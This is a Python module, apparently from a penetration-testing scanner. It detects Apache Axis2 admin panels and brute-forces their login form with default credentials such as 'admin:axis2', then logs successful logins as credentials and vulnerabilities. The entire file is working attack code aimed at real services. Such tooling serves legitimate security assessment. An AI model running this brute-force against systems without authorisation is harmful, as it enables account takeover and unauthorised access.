import os.path

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds
from lib.httpscan.http import HTTP

creds = [
    "admin:axis2",
    "admin:admin",
    "axis2:axis2",
]

class Module:
    name = 'Axis2'
    description = 'Discover and exploit Axis2 (bruteforce)'

    def run(self, target, args, useragent, proxy, timeout, safe):
        http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)

        Output.minor({'target': http.url(target['path']), 'message': '[%s] Running module...' % self.name})

        urls = ['axis2']

        for url in urls:
            output = http.get(os.path.join(target['path'], url))

            if not output or not output['code'] in [200, 401] or not 'axis' in output['title'].lower():
                continue

            http_info = {
                'hostname': target['hostname'],
                'port': target['port'],
                'protocol': 'tcp',
                'service': 'http',
                'url': http.url(os.path.join(target['path'], url)),
                'http': {
                    'path': os.path.join(target['path'], url),
                    'code': output['code'],
                    'server': output['server'],
                    'title': output['title'],
                    'content-type': output['content-type'],
                },
                'tags': ['axis2']
            }
            DB.insert_http_url(http_info)

            output['message_type'] = 'http'
            output['target'] = http.url(os.path.join(target['path'], url))
            Output.write(output)

            login_url = os.path.join(target['path'], url, 'axis2-admin') + '/'
            output = http.get(login_url)

            if not output['code'] in [200] or not 'axis' in output['title'].lower():
                continue

            form = None
            for f in output['forms']:
                if not 'name' in f:
                    continue

                if 'login' in f['name'].lower():
                    form = f
                    break

            if form == None:
                continue

            if args['bruteforce']:
                Output.highlight({'target': http.url(login_url), 'message': '[%s] Starting bruteforce...' % self.name})
                for cred in gen_bruteforce_creds(args['bruteforce'], creds):
                    username, password = cred.split(':')

                    for arg in form['args']:
                        if 'username' in arg.lower():
                            form['args'][arg] = username

                        if 'password' in arg.lower():
                            form['args'][arg] = password

                    res = http.send_form(login_url, form, html=output['html'], cookies=output['cookies'])

                    after_auth_form = None
                    for f in res['forms']:
                        if not 'name' in f:
                            continue

                        if 'login' in f['name'].lower():
                            after_auth_form = f
                            break

                    if after_auth_form != None:
                        continue

                    Output.success({'target': http.url(login_url), 'message': '[%s] Authentication success to Axis2 with login %s and password %s' % (self.name, username, password)})

                    cred_info = {
                        'hostname': target['hostname'],
                        'port': target['port'],
                        'service': 'http',
                        'url': http.url(login_url),
                        'type': 'password',
                        'username': username,
                        'password': password,
                        'tags': ['axis2'],
                    }
                    DB.insert_credential(cred_info)

                    vuln_info = {
                        'hostname': target['hostname'],
                        'port': target['port'],
                        'service': 'http',
                        'url': http.url(login_url),
                        'name': 'Default or predictable credentials on Axis2 service',
                        'description': 'Axis2 %s possess the following default or weak credentials: %s:%s' % (http.url(login_url), username, password),
                    }
                    DB.insert_vulnerability(vuln_info)



